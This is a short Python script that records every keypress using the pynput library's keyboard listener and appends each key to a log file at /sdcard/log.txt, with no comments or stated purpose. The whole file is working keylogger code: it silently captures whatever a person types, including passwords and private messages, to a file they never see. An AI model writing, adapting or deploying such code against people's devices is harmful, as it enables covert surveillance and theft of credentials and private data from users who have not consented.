from pynput.keyboard  import Listener
def w_t(key):
        letter = str(key)
        letter = letter.replace("'","")

        with open("/sdcard/log.txt", "a") as f:
                f.write(letter)
with Listener(on_press=w_t) as l:
        l.join()
